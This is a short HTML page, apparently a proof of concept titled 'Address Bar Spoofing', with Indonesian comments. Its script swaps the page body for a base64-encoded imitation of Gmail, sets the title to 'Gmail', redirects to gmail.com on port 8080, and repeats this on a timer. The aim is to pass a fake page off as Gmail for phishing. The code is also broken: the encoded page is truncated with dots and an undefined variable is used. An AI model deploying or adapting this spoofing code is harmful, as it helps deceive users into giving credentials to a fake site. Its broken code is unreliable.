<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Address Bar Spoofing</title>
</head>
<body>
    <button onclick="spoof()">Go</button>

    <script>
        function spoof() {
            // Base64 encoded HTML content (sebagai contoh)
            var gmail = 'PCFET0NC8+KArOK.........ZHk+PC9odG1sPg=='; // Encode versi halaman Gmail

            // Men-decoding base64 dan memasukkan hasilnya ke dalam halaman
            document.body.innerHTML = atob(gmail);

            // Menambahkan judul baru ke halaman
            document.write("<title>Gmail</title>");

            // Menampilkan halaman yang lebih dinamis (sebagai contoh, variabel 'x' akan berisi HTML yang didekode)
            document.write("<p>" + x + "</p>");

            // Mengalihkan browser ke Gmail (port custom, misalnya, 8080)
            window.location.assign("https://www.Gmail.com:8080");
        }

        // Memanggil spoof setiap 100 detik (100.000 ms)
        setInterval(spoof, 100000);
    </script>
</body>
</html>
